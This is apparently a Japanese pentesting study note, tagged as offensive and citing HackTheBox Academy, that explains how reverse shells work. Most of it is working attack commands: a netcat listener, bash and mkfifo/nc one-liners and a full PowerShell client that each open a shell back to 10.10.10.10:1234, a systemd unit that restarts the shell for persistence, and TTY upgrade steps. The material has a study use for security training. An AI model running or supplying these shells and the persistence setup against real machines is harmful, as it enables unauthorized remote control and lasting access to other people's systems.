---
tags:
  - Offensive
---

# Reverse Shell

エクスプロイトを実行して、攻撃対象のマシンに侵入またはリモートコードを実行できるとき、攻撃対象のマシンでコマンドを実行して、自分のマシンにシェルにリダイレクトさせることで、そのプロセスが生きている間は自分のマシンからいくらでもコマンドを実行できる。

[[BindShell]]の逆。

攻撃対象が自分からシェルを渡しに行く形になるので、INPUTのファイアーウォールを無視できる。

攻撃対象のマシンでシェルが閉じられた場合、すぐに切れてしまうのが弱点。そうなった場合、またエクスプロイトを実行してやり直す必要がある。その対策として、サービスとして自動で起動させる方法もある。

## NetCatで待ち受ける
```bash
nc -vnlp <使いたいポート>
```

## 攻撃対象のマシンで実行するコマンド例

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

- bash
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
- Powershell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## サービスの例

- .serviceファイル
```service
[Unit]
Description=<サービの説明>

[Service]
ExecStart=/bin/bash <サービスのshファイル>
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```
- サービスを起動
```
systemctl enable <サービス名>
```

## TTY

このままでは、矢印などが効かないので、ttyの設定をする。

1. 攻撃対象のマシンで実行(nc上)
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

2. 自分のマシンで実行
`Ctrl + z`で一時停止して、以下のコマンドを実行する。
```bash
stty raw -echo; fg
```

3. 自分のマシンで実行 (オプション)
以下の2つの出力をメモする。
```bash
echo $TERM
```
```bash
stty size
```
4. 攻撃対象のマシンで実行(nc上)
環境に合わせて適宜調整する。
```bash
export TERM=さっきの出力
```
```bash
stty rows さっきの出力 columns さっきの出力
```

---

## 参照

1. https://academy.hackthebox.com/module/77/section/725
2. https://qiita.com/docdocdoc/items/2427fa5ea28adc9f329f0